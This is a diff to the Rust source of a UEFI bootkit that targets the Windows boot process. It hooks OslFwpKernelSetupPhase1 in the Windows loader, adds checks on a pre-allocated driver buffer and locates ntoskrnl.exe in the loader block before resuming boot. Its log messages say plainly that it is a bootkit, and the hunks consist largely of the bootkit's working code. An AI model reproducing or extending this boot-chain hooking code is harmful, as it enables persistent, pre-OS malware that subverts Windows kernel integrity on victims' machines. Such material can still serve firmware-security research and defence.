@@ -1,5 +1,6 @@
 #![no_main]
 #![no_std]
+#![feature(offset_of)]
 
 extern crate alloc;
 
@@ -9,15 +10,15 @@ mod hook;
 mod utils;
 mod windows;
 
+use crate::global::*;
+use crate::hook::Hook;
+use crate::windows::{KLDR_DATA_TABLE_ENTRY, LOADER_PARAMETER_BLOCK};
 use alloc::slice;
 use core::ffi::c_void;
 use core::u8;
-use global::*;
-use hook::Hook;
 use uefi::prelude::*;
 use uefi::proto::loaded_image::LoadedImage;
 use uefi::table::boot::LoadImageSource;
-use windows::LOADER_PARAMETER_BLOCK;
 
 #[panic_handler]
 fn panic_handler(info: &core::panic::PanicInfo) -> ! {
@@ -28,17 +29,17 @@ fn panic_handler(info: &core::panic::PanicInfo) -> ! {
             location.line(),
             location.column()
         );
-        if let Some(message) = info.payload().downcast_ref::<&str>() {
-            log::error!("[-] {}", message);
-        }
+        // if let Some(message) = info.payload().downcast_ref::<&str>() {
+        //     log::error!("[-] {}", message);
+        // }
     }
     loop {}
 }
 
-fn setup_efi(image_handle: Handle, system_table: &mut SystemTable<Boot>) {
+fn setup_efi(image_handle: Handle, system_table: &SystemTable<Boot>) {
     com_logger::builder()
         .base(0x2f8)
-        .filter(log::LevelFilter::Info)
+        .filter(log::LevelFilter::Debug)
         .setup();
     let boot_services = system_table.boot_services();
     unsafe { boot_services.set_image_handle(image_handle) };
@@ -46,8 +47,9 @@ fn setup_efi(image_handle: Handle, system_table: &mut SystemTable<Boot>) {
 }
 
 #[entry]
-fn efi_main(image_handle: Handle, mut system_table: SystemTable<Boot>) -> Status {
-    setup_efi(image_handle, &mut system_table);
+fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
+    // uefi_services::init(&mut system_table).unwrap();
+    setup_efi(image_handle, &system_table);
     let boot_services = system_table.boot_services();
     log::info!("[*] Searching Windows EFI bootmgr");
     let bootmgr_device_path = boot::windows_bootmgr_device_path(boot_services)
@@ -207,6 +209,17 @@ fn osl_fwp_kernel_setup_phase1_hook(loader_block: *mut LOADER_PARAMETER_BLOCK) -
     log::info!("[+] OslFwpKernelSetupPhase1 hook successful!");
     let osl_fwp_kernel_setup_phase1 =
         unsafe { OSL_FWP_KERNEL_SETUP_PHASE1.take().unwrap().unhook() };
+    unsafe {
+        if DRIVER_ALLOCATED_BUFFER.is_null() {
+            log::error!("[-] As driver allocation failed, the bootkit will abort now :(");
+            return osl_fwp_kernel_setup_phase1(loader_block);
+        }
+    };
+    let ntoskrnl: KLDR_DATA_TABLE_ENTRY = unsafe {
+        *utils::get_module_entry(&mut (*loader_block).LoadOrderListHead, "ntoskrnl.exe")
+            .expect("Unable to find ntoskrnl.exe kernel entry")
+    };
+    log::info!("[*] Found ntoskrnl at address {:?}, size {:#010x}", ntoskrnl.DllBase, ntoskrnl.SizeOfImage);
     log::info!("[*] Resuming OslFwpKernelSetupPhase1 execution");
     osl_fwp_kernel_setup_phase1(loader_block)
 }
